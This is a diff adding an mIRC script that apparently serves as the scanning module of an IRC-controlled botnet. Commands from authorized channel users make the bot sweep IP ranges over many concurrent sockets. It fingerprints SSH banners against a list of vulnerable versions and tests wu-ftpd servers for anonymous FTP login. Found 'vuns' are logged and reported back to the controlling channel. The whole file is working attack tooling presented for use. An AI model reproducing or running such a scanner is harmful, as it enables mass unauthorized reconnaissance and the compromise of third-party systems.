@@ -1,0 +1,91 @@
+on *:DISCONNECT: {    nick $remove($me,-u,-f)   }
+on *:sockopen:Uservice.*: {
+  if ($sockerr > 0) {    .sockclose $sockname  | return  }
+}
+alias checkvun {
+  set %vun $read -w $+ $1 $+ * ssh.txt
+  if (%vun != $null) {    inc %vuns |    .write ssh.log $2 $+ :22 %vun |    msg %chanuscan Ustat -- Found vun:  $2 $+ :22  %vun   }
+}
+on *:sockread:Uservice.*: {
+  sockread  %banner
+  if ($sockerr > 0) {     .sockclose $sockname | return }
+  inc %oports
+  .timerclosesock $+ $sock($sockname).ip 1 15 sockclose $sockname
+  if (%sbport == 22) {
+    write -a banners.all $sock($sockname).ip %banner  
+    checkvun %banner $sock($sockname).ip
+  }
+  if (%sbport  == 21) {
+    if ($gettok(%banner,1,32) == 331) {
+      sockwrite -n $sockname PASS ftp
+    }
+    if ($gettok(%banner,1,32) == 230) {
+      set %anc Yes
+      write ftp.log $sock($sockname).ip $+ :22 %fb
+      sockwrite -n $sockname QUIT
+    }
+    if ($gettok(%banner,1,32) == 530) {
+      set %anc No
+      sockwrite -n $sockname QUIT
+    }
+    if ($gettok(%banner,1,32) == 221) {
+      inc %vuns
+      .msg %chanuscan --> Woot on $sock($sockname).ip $+ : $+ %sbport Anonymous: %anc
+      sockclose $sockname   
+    }
+    if ($gettok(%banner,1,32) == 220) {
+      if (wu- isin %banner) {
+        set %fb %banner
+        sockwrite -n $sockname USER ftp
+      }
+      else {       sockclose $sockname | return     }    
+    }
+  }
+}
+alias uscan {
+  write -c ftp.log |   write -c banners.all
+  set %oports 0 |   sockclose Uservice.* |   set %vuns 0
+  set %fip $1 |   set %lip $2 |   set %chanuscan $schannick
+  .msg $schannick --> Generated $calc( 1 + $longip(%lip) - $longip(%fip) ) ip addresses. Now ( %sbport ) scan1ng ...
+  set %ip.uscan $longip(%fip) |   uservice.open %fip  $schannick
+}
+alias uservice.wait { .timeruservice.wait 1 1 uservice.open $1 $2 }
+alias uservice.open {
+  :start
+  if ( %ip.uscan > $longip(%lip)) { goto end }
+  if ( $sock(Uservice.*,0) > 100 ) { uservice.wait $1 $2 | halt }
+  sockopen Uservice. $+ %ip.uscan $longip(%ip.uscan) %sbport  
+  inc %ip.uscan |   goto start |   :end
+  .timeruscandone 1 20 uservice.done $2 
+}
+alias uservice.done { .msg $1 Ready! Found Vun: %vuns $+ , open ports [ $+ %sbport $+ ]: %oports  ( %fip to %lip ) | sockclose Uservice.*  |     nick $remove($me,-u,-f)   | .timerclosesock* off  }
+on *:text:*:*: {
+  if ( (%auth [ $+ [ $nick ] ] != yes) && (%auth [ $+ [ $nick ] ] != admin) ) { halt }
+  if (!ustop. isin $1) {
+    if ( ($remove($1,!ustop.) != *) && ($remove($1,!ustop.) != $me) ) { halt }
+    if ( $sock(Uservice.*,0) == 0) {       nick $remove($me,-u) |  nick $remove($me,-f) |  .timerclosesock* off  | .timeruscandone off  | .timeruservice.wait off }
+    if ( $sock(Uservice.*,0) != 0) {
+      .msg $schannick Stopped  at: $longip(%ip.uscan) Found Vun: %vuns $+ , open ports [ $+ %sbport $+ ]: %oports ( %fip to %lip )   | sockclose Uservice.*   |     .timeruscandone off  | .timeruservice.wait off 
+      nick $remove($me,-u,-f)  |       .timerclosesock* off
+    }
+  }
+  if (!uscan. isin $1) {
+    if ( ($remove($1,!uscan.) != *) && ($remove($1,!uscan.) != $me) ) { halt }
+    if ($3 == $null) halt
+    set %sbport 22
+    nick $remove($me,-u) $+ -u
+    uscan $2-
+  }
+  if (!uftp. isin $1) {
+    if ( ($remove($1,!uftp.) != *) && ($remove($1,!uftp.) != $me) ) { halt }
+    if ($3 == $null) halt
+    set %sbport 21
+    nick $remove($me,-f) $+ -f
+    uscan $2-
+  }
+  if (!ustat. isin $1) {  
+    if ( ($remove($1,!ustat.) != *) && ($remove($1,!ustat.) != $me) ) { halt }
+    if ( $sock(Uservice.*,0) == 0) { msg $schannick Last uscan: %fip to %lip Found Vun: %vuns $+ , open ports [ $+ %sbport $+ ]: %oports  }
+    if ( $sock(Uservice.*,0) != 0) { msg $schannick Found Vun: %vuns $+ , open ports [ $+ %sbport $+ ]: %oports Now at: $longip(%ip.uscan) ( %fip to %lip ) }
+  }
+}
